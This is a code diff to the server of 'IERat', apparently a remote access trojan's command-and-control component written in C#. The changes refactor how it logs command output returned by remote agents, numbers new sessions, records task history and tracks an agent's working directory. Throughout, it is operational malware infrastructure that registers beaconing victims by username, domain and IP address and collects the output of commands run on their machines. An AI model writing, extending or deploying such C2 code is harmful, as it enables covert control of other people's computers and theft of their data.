@@ -1,9 +1,7 @@
-﻿using IERat;
-using System;
+﻿using System;
 using System.Threading.Tasks;
 using WatsonWebserver;
 using IERatServer.lib;
-using IERat.lib;
 using Newtonsoft.Json;
 
 namespace IERatServer
@@ -42,23 +40,27 @@ namespace IERatServer
                     else
                     {
                         Console.ForegroundColor = ConsoleColor.Green;
-                        Console.WriteLine($"\nCommand Output received [{taskObject.Type} {taskObject.args}]: {taskObject.Result}\n");
-                        Logger.Log("info", $"Command Output received from agent {requestObject.AgentID}: [{taskObject.Type} {taskObject.args}]: {taskObject.Result}");
+                        Console.WriteLine($"\nCommand Output received [{taskObject.Type} command]: {taskObject.Result}\n");
+                        Logger.Log("info", $"Command Output received from agent {requestObject.AgentID}: [{taskObject.Type} command]: {taskObject.Result}");
                         Console.ForegroundColor = ConsoleColor.White;
-                        Db.TaskHistory.Add(new TaskHistoryObject() { AgentID = requestObject.AgentID, task = taskObject });
+
+                        AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == CLI.InteractContext);
+                        var agent = ActiveChannel.agent;
+
+                        Db.TaskHistory.Add(new TaskHistoryObject() { 
+                            AgentID = requestObject.AgentID,
+                            AgentNumber = ActiveChannel.InteractNum,
+                            task = taskObject });
 
                         if (taskObject.Type == "cd")
                         {
-                            AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == CLI.InteractContext);
-                            var agent = ActiveChannel.agent;
                             if (ActiveChannel != null)
                             {
                                 agent.Cwd = taskObject.Result.Split(new string[] { " " }, StringSplitOptions.None)[3];
                                 CLI.loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
                             }
                         }
-                    }
-                   
+                    }                  
                 }
 
                 if (Db.GetChannelFromID(requestObject.AgentID) != null) { Db.GetChannelFromID(requestObject.AgentID).UpdateHeartBeatTime(); }
@@ -96,10 +98,10 @@ namespace IERatServer
                 if (!Db.AgentExists(beacon.ID))
                 {
                     responseObject.Notes = "Authenticated";
-                    Db.NewAgentChannel(beacon, ctx.Request.Source.IpAddress);
+                    var newSessionNumber = Db.NewAgentChannel(beacon, ctx.Request.Source.IpAddress);
                     Console.ForegroundColor = ConsoleColor.Blue;
-                    Console.WriteLine($"\nNew agent connection received from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]\n");
-                    Logger.Log("info", $"New agent connection received from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]");
+                    Console.WriteLine($"\nNew session opened [#{newSessionNumber}] from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]\n");
+                    Logger.Log("info", $"New session opened [#{newSessionNumber}] from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]");
                     Console.ForegroundColor = ConsoleColor.White;
                 }
                 var responseString = JsonConvert.SerializeObject(responseObject);
